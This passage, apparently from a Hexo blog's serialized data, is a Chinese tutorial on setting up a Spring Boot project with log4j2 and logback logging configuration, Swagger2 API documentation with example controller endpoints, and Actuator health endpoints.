level=&quot;error&quot; onMatch=&quot;ACCEPT&quot; onMismatch=&quot;DENY&quot; /&gt;</span><br><span class=\"line\">            &lt;/Filters&gt;</span><br><span class=\"line\">            &lt;!-- 指定每天的最大压缩包个数，默认7个，超过了会覆盖之前的 --&gt;</span><br><span class=\"line\">            &lt;DefaultRolloverStrategy max=&quot;50&quot;/&gt;</span><br><span class=\"line\">        &lt;/RollingRandomAccessFile&gt;</span><br><span class=\"line\">    &lt;/Appenders&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;!-- 全局配置，默认所有的Logger都继承此配置 --&gt;</span><br><span class=\"line\">    &lt;Loggers&gt;</span><br><span class=\"line\">        &lt;!-- AsyncRoot - 异步记录日志 - 需要LMAX Disruptor的支持 --&gt;</span><br><span class=\"line\">        &lt;AsyncRoot level=&quot;info&quot; additivity=&quot;false&quot;&gt;</span><br><span class=\"line\">            &lt;AppenderRef ref=&quot;console&quot;/&gt;</span><br><span class=\"line\">            &lt;AppenderRef ref=&quot;infoFile&quot;/&gt;</span><br><span class=\"line\">            &lt;AppenderRef ref=&quot;errorFile&quot;/&gt;</span><br><span class=\"line\">        &lt;/AsyncRoot&gt;</span><br><span class=\"line\">    &lt;/Loggers&gt;</span><br><span class=\"line\">&lt;/Configuration&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>使用</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Controller</span><br><span class=\"line\">public class TestController &#123;</span><br><span class=\"line\">    Logger logger = LogManager.getLogger(TestController.class);</span><br><span class=\"line\"></span><br><span class=\"line\">    @RequestMapping(value = &quot;test&quot;, method = RequestMethod.GET)</span><br><span class=\"line\">    @ResponseBody</span><br><span class=\"line\">    public String test()&#123;</span><br><span class=\"line\">        logger.debug(&quot;test debug&quot;);</span><br><span class=\"line\">        logger.info(&quot;test info&quot;);</span><br><span class=\"line\">        logger.warn(&quot;test warn&quot;);</span><br><span class=\"line\">        logger.error(&quot;test error&quot;);</span><br><span class=\"line\">        logger.fatal(&quot;test fatal&quot;);</span><br><span class=\"line\">        return &quot;ok&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h5 id=\"logback-默认\"><a href=\"#logback-默认\" class=\"headerlink\" title=\"logback(默认)\"></a>logback(默认)</h5><p>在resouces下添加logback-spring.xml配置文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;configuration&gt;</span><br><span class=\"line\">\t&lt;include resource=&quot;org/springframework/boot/logging/logback/base.xml&quot; /&gt;</span><br><span class=\"line\">\t&lt;jmxConfigurator/&gt;</span><br><span class=\"line\">\t&lt;!--&lt;property name=&quot;log.path&quot; value=&quot;/home/jzyx/epmnew/logs&quot;/&gt;--&gt;</span><br><span class=\"line\">    &lt;property name=&quot;log.path&quot; value=&quot;D:\\\\Logs\\\\aipmanage\\\\logs\\\\&quot;/&gt;</span><br><span class=\"line\">\t&lt;!--&lt;property name=&quot;log.path&quot; value=&quot;\\\\opt&quot;/&gt;--&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;appender name=&quot;console&quot; class=&quot;ch.qos.logback.core.ConsoleAppender&quot;&gt;</span><br><span class=\"line\">\t\t&lt;!-- Log message format --&gt;</span><br><span class=\"line\">\t\t&lt;encoder&gt;</span><br><span class=\"line\">\t\t\t&lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; %5level --- [%thread] %logger&#123;36&#125; : %msg%n&lt;/pattern&gt;</span><br><span class=\"line\">\t\t\t&lt;charset&gt;UTF-8&lt;/charset&gt;</span><br><span class=\"line\">\t\t&lt;/encoder&gt;</span><br><span class=\"line\">\t\t&lt;!-- deny all events with a level below DEBUG, that is TRACE  --&gt;</span><br><span class=\"line\">\t\t&lt;filter class=&quot;ch.qos.logback.classic.filter.ThresholdFilter&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;level&gt;DEBUG&lt;/level&gt;</span><br><span class=\"line\">\t\t&lt;/filter&gt;</span><br><span class=\"line\">\t&lt;/appender&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;appender name=&quot;sysDailyRollingFile&quot; class=&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&gt;</span><br><span class=\"line\">\t\t&lt;!--  &lt;file&gt;E:\\\\项目\\\\demoClientLog\\\\sys.log&lt;/file&gt;--&gt;</span><br><span class=\"line\">\t\t&lt;rollingPolicy class=&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;!-- daily rollover --&gt;</span><br><span class=\"line\">\t\t\t&lt;fileNamePattern&gt;$&#123;log.path&#125;\\\\demoClient-DEBUG-%d&#123;yyyyMMdd&#125;.log&lt;/fileNamePattern&gt;</span><br><span class=\"line\">\t\t\t&lt;!-- 保留30天的日志 --&gt;</span><br><span class=\"line\">\t\t\t&lt;maxHistory&gt;30&lt;/maxHistory&gt;</span><br><span class=\"line\">\t\t&lt;/rollingPolicy&gt;</span><br><span class=\"line\">\t\t&lt;encoder&gt;</span><br><span class=\"line\">\t\t\t&lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; %5level --- [%thread] %logger&#123;36&#125; : %msg%n&lt;/pattern&gt;</span><br><span class=\"line\">\t\t\t&lt;charset&gt;UTF-8&lt;/charset&gt;</span><br><span class=\"line\">\t\t&lt;/encoder&gt;</span><br><span class=\"line\">\t\t&lt;filter class=&quot;ch.qos.logback.classic.filter.ThresholdFilter&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;level&gt;DEBUG&lt;/level&gt;</span><br><span class=\"line\">\t\t&lt;/filter&gt;</span><br><span class=\"line\">\t&lt;/appender&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;appender name=&quot;infoDailyRollingFile&quot; class=&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&gt;</span><br><span class=\"line\">\t\t&lt;!-- &lt;file&gt;E:\\\\项目\\\\demoClientLog\\\\demoClient-info.log&lt;/file&gt; --&gt;</span><br><span class=\"line\">\t\t&lt;rollingPolicy class=&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;!-- daily rollover --&gt;</span><br><span class=\"line\">\t\t\t&lt;fileNamePattern&gt;$&#123;log.path&#125;\\\\demoClient-INFO-%d&#123;yyyyMMdd&#125;.log&lt;/fileNamePattern&gt;</span><br><span class=\"line\">\t\t\t&lt;!-- 保留30天的日志 --&gt;</span><br><span class=\"line\">\t\t\t&lt;maxHistory&gt;30&lt;/maxHistory&gt;</span><br><span class=\"line\">\t\t&lt;/rollingPolicy&gt;</span><br><span class=\"line\">\t\t&lt;encoder&gt;</span><br><span class=\"line\">\t\t\t&lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; %5level --- [%thread] %logger&#123;36&#125; : %msg%n&lt;/pattern&gt;</span><br><span class=\"line\">\t\t\t&lt;charset&gt;UTF-8&lt;/charset&gt;</span><br><span class=\"line\">\t\t&lt;/encoder&gt;</span><br><span class=\"line\">\t\t&lt;filter class=&quot;ch.qos.logback.classic.filter.LevelFilter&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;level&gt;INFO&lt;/level&gt;</span><br><span class=\"line\">\t\t\t&lt;onMatch&gt;ACCEPT&lt;/onMatch&gt;</span><br><span class=\"line\">\t\t\t&lt;onMismatch&gt;DENY&lt;/onMismatch&gt;</span><br><span class=\"line\">\t\t&lt;/filter&gt;</span><br><span class=\"line\">\t&lt;/appender&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;appender name=&quot;severeDailyRollingFile&quot; class=&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&gt;</span><br><span class=\"line\">\t\t&lt;!-- &lt;file&gt;E:\\\\项目\\\\demoClientLog\\\\demoClient-severe.log&lt;/file&gt; --&gt;</span><br><span class=\"line\">\t\t&lt;rollingPolicy class=&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;!-- daily rollover --&gt;</span><br><span class=\"line\">\t\t\t&lt;fileNamePattern&gt;$&#123;log.path&#125;\\\\demoClient-ERROR-%d&#123;yyyyMMdd&#125;.log&lt;/fileNamePattern&gt;</span><br><span class=\"line\">\t\t\t&lt;!-- 保留30天的日志 --&gt;</span><br><span class=\"line\">\t\t\t&lt;maxHistory&gt;30&lt;/maxHistory&gt;</span><br><span class=\"line\">\t\t&lt;/rollingPolicy&gt;</span><br><span class=\"line\">\t\t&lt;encoder&gt;</span><br><span class=\"line\">\t\t\t&lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; %5level --- [%thread] %logger&#123;36&#125; : %msg%n&lt;/pattern&gt;</span><br><span class=\"line\">\t\t\t&lt;charset&gt;UTF-8&lt;/charset&gt;</span><br><span class=\"line\">\t\t&lt;/encoder&gt;</span><br><span class=\"line\">\t\t&lt;!-- deny all events with a level below WARN, that is TRACE, DEBUG, and INFO --&gt;</span><br><span class=\"line\">\t\t&lt;filter class=&quot;ch.qos.logback.classic.filter.ThresholdFilter&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;level&gt;ERROR&lt;/level&gt;</span><br><span class=\"line\">\t\t&lt;/filter&gt;</span><br><span class=\"line\">\t&lt;/appender&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;logger name=&quot;com.bonc.demoClient&quot; level=&quot;DEBUG&quot;&gt;</span><br><span class=\"line\">\t\t&lt;appender-ref ref=&quot;infoDailyRollingFile&quot; /&gt;</span><br><span class=\"line\">\t\t&lt;appender-ref ref=&quot;severeDailyRollingFile&quot; /&gt;</span><br><span class=\"line\">\t&lt;/logger&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;!-- the root level of logging --&gt;</span><br><span class=\"line\">\t&lt;root level=&quot;INFO&quot;&gt;</span><br><span class=\"line\">\t\t&lt;appender-ref ref=&quot;sysDailyRollingFile&quot; /&gt;</span><br><span class=\"line\">\t\t&lt;appender-ref ref=&quot;infoDailyRollingFile&quot; /&gt;</span><br><span class=\"line\">\t\t&lt;appender-ref ref=&quot;severeDailyRollingFile&quot; /&gt;</span><br><span class=\"line\">\t&lt;/root&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">private static final Logger logger = LoggerFactory.getLogger(ApiController.class);</span><br><span class=\"line\">.......</span><br><span class=\"line\">logger.info(&quot;.....&quot;);</span><br></pre></td></tr></table></figure>\n<h4 id=\"2-Restful-API\"><a href=\"#2-Restful-API\" class=\"headerlink\" title=\"2.Restful API\"></a>2.Restful API</h4><p>使用swagger2</p>\n<ul>\n<li><p>依赖</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  &lt;!-- Swagger依赖 注意版本一致--&gt;</span><br><span class=\"line\">  &lt;dependency&gt;</span><br><span class=\"line\">\t&lt;groupId&gt;io.springfox&lt;/groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt;</span><br><span class=\"line\">\t&lt;version&gt;2.2.2&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">\t&lt;groupId&gt;io.springfox&lt;/groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt;</span><br><span class=\"line\">\t&lt;version&gt;2.2.2&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>配置类</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Configuration</span><br><span class=\"line\">@EnableSwagger2</span><br><span class=\"line\">public class Swagger2 &#123;</span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * apis()设置监控路径</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    @Bean</span><br><span class=\"line\">    public Docket createRestApi() &#123;</span><br><span class=\"line\">        return new Docket(DocumentationType.SWAGGER_2)</span><br><span class=\"line\">                .apiInfo(apiInfo())</span><br><span class=\"line\">                .select()</span><br><span class=\"line\">                .apis(RequestHandlerSelectors.basePackage(&quot;com.example.springboottemplate.controllers&quot;))</span><br><span class=\"line\">                .paths(PathSelectors.any())</span><br><span class=\"line\">                .build();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 创建api基本信息，会展示在文档页面</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    private ApiInfo apiInfo() &#123;</span><br><span class=\"line\">        return new ApiInfoBuilder()</span><br><span class=\"line\">                .title(&quot;Swagger2 demo&quot;)</span><br><span class=\"line\">                .description(&quot;Spring Boot中使用Swagger2构建RESTful APIs&quot;)</span><br><span class=\"line\">                .version(&quot;1.0&quot;)</span><br><span class=\"line\">                .build();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>使用<br><br><strong>注意：要使用@RequestParam()接收参数，需要paramType=”query”</strong><br><br>具体参数信息:<a href=\"https://amphilicitezh.github.io/2017/12/04/swaggerui-introduce/\" target=\"_blank\" rel=\"noopener\">https://amphilicitezh.github.io/2017/12/04/swaggerui-introduce/</a></p>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Api(value = &quot;测试接口类TestController&quot;)</span><br><span class=\"line\">@Controller</span><br><span class=\"line\">@ResponseBody</span><br><span class=\"line\">public class TestController &#123;</span><br><span class=\"line\">    Logger logger = LogManager.getLogger(TestController.class);</span><br><span class=\"line\"></span><br><span class=\"line\">    @ApiOperation(value = &quot;测试get不带参数&quot;,notes = &quot;测试get不带参数&quot;)</span><br><span class=\"line\">    @RequestMapping(value = &quot;test1&quot;, method = RequestMethod.GET)</span><br><span class=\"line\">    public String test()&#123;</span><br><span class=\"line\">        logger.debug(&quot;test debug&quot;);</span><br><span class=\"line\">        logger.info(&quot;test info&quot;);</span><br><span class=\"line\">        logger.warn(&quot;test warn&quot;);</span><br><span class=\"line\">        logger.error(&quot;test error&quot;);</span><br><span class=\"line\">        logger.fatal(&quot;test fatal&quot;);</span><br><span class=\"line\">        return &quot;ok&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @ApiOperation(value = &quot;测试get带参数&quot;,notes = &quot;测试get带参数&quot;)</span><br><span class=\"line\">    @ApiImplicitParam(name = &quot;username&quot;, value = &quot;用户名&quot;, required = true, dataType = &quot;String&quot;,paramType = &quot;query&quot;)</span><br><span class=\"line\">    @RequestMapping(value = &quot;test2&quot;, method = RequestMethod.GET)</span><br><span class=\"line\">    public String test2(@RequestParam(&quot;username&quot;) String username)&#123;</span><br><span class=\"line\">        if(!username.equals(&quot;&quot;) &amp;&amp; username != null)&#123;</span><br><span class=\"line\">            System.out.println(username);</span><br><span class=\"line\">            return username;</span><br><span class=\"line\">        &#125;else &#123;</span><br><span class=\"line\">            return &quot;null&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @ApiOperation(value = &quot;测试post带实体参数&quot;, notes = &quot;测试post带实体参数&quot;)</span><br><span class=\"line\">    @ApiImplicitParam(name = &quot;user&quot;,value = &quot;用户名&quot;,required = true, dataType = &quot;Map&lt;String,Object&gt;&quot;)</span><br><span class=\"line\">    @ApiResponses(&#123;</span><br><span class=\"line\">           @ApiResponse(code = 400, message = &quot;请求参数没填好,注意为json&quot;),</span><br><span class=\"line\">           @ApiResponse(code = 404, message = &quot;请求路径没有或页面跳转路径不对&quot;),</span><br><span class=\"line\">           @ApiResponse(code = 500, message = &quot;服务器端发生错误&quot;)</span><br><span class=\"line\">   &#125;)</span><br><span class=\"line\">    @RequestMapping(value = &quot;/test3&quot;, method = RequestMethod.POST)</span><br><span class=\"line\">    public String test3(@RequestBody Map&lt;String,Object&gt; user)&#123;</span><br><span class=\"line\">        System.out.println(user.get(&quot;username&quot;).toString());</span><br><span class=\"line\">        System.out.println(user.get(&quot;password&quot;).toString());</span><br><span class=\"line\">        return &quot;ok&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @ApiOperation(value = &quot;测试post参数为String&quot;, notes = &quot;测试post参数为String&quot;)</span><br><span class=\"line\">    @ApiImplicitParams(&#123;</span><br><span class=\"line\">            @ApiImplicitParam(name = &quot;username&quot;, value = &quot;用户名&quot;, required = true, paramType = &quot;query&quot;, dataType = &quot;String&quot;),</span><br><span class=\"line\">            @ApiImplicitParam(name = &quot;password&quot;, value = &quot;密码&quot;, required = true, paramType = &quot;query&quot;, dataType = &quot;String&quot;)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    @RequestMapping(value = &quot;/test4&quot;, method = RequestMethod.POST)</span><br><span class=\"line\">    public String test4(@RequestParam(&quot;username&quot;) String username,</span><br><span class=\"line\">                        @RequestParam(&quot;password&quot;) String passwprd)&#123;</span><br><span class=\"line\">       return username + &quot;:&quot; + passwprd;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @ApiOperation(value = &quot;测试restful类型接口&quot;, notes = &quot;测试restful类型接口&quot;)</span><br><span class=\"line\">    @RequestMapping(value = &quot;/test5/&#123;name&#125;&quot;, method = RequestMethod.GET)</span><br><span class=\"line\">    @ApiImplicitParam(name = &quot;username&quot;, value = &quot;用户名&quot;, required = true, paramType = &quot;query&quot;, dataType = &quot;String&quot;)</span><br><span class=\"line\">    public String test5(@PathVariable(&quot;name&quot;) String name,</span><br><span class=\"line\">                        @RequestParam(&quot;username&quot;) String username)&#123;</span><br><span class=\"line\">        return name + &quot; : &quot; + username;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>访问:<a href=\"http://127.0.0.1:8080/swagger-ui.html\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/swagger-ui.html</a></p>\n<h4 id=\"3-Health\"><a href=\"#3-Health\" class=\"headerlink\" title=\"3.Health\"></a>3.Health</h4><p>这是2.0版本：<a href=\"https://blog.csdn.net/alinyua/article/details/80009435\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/alinyua/article/details/80009435</a><br><br>可以直观的看到自己CPU的利用率、内存的利用率、数据库连接是否正常等信息</p>\n<ul>\n<li><p>依赖</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;!--&lt;version&gt;2.1.0.RELEASE&lt;/version&gt;--&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>Springboot2版本需要在application.properties加入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">management.endpoints.web.exposure.include=*</span><br><span class=\"line\">#显示所有健康状态，需要加配置</span><br><span class=\"line\">management.endpoint.health.show-details=always</span><br></pre></td></tr></table></figure>\n<p>内置EndPoints：</p>\n<blockquote>\n<p><a href=\"http://127.0.0.1:8080/actuator\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/actuator</a><br><br><a href=\"http://127.0.0.1:8080/actuator/health\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/actuator/health</a><br><br><a href=\"http://127.0.0.1:8080/actuator/info\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/actuator/info</a><br><br><a href=\"http://127.0.0.1:8080/actuator/beans\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/actuator/beans</a><br><br><a href=\"http://127.0.0.1:8080/actuator/httptrace\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/actuator/httptrace</a></p>\n</blockquote>\n</li>\n</ul>\n<h4 id=\"4-Eureka\"><a href=\"#4-Eureka\" class=\"headerlink\" title=\"4.Eureka\"></a>4.Eureka</h4>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"springboot架子搭建\"><a href=\"#springboot架子搭建\" class=\"headerlink\" title=\"springboot架子搭建\"></a>springboot架子搭建</h3><h4 id=\"1-日志\"><a href=\"#1-日志\" class=\"headerlink\" title=\"1.日志\"></a>1.日志</h4><h5 id=\"（1）log4j2\"><a href=\"#（1）log4j2\" class=\"headerlink\" title=\"（1）log4j2\"></a>（1）log4j2</h5><ul>\n<li><p>依赖</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!--引入log4j2--&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;spring-boot-starter-log4j2&lt;/artifactId&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br><span class=\"line\">&lt;!--log4j2依赖于disruptor--&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;com.lmax&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;disruptor&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;3.4.2&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>配置文件log4j2.xml<br>log4j2默认会在classpath目录下寻找log4j.json、log4j.jsn、log4j2.xml等名称的文件，如果都没有找到，则会按默认配置输出，也就是输出到控制台</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span 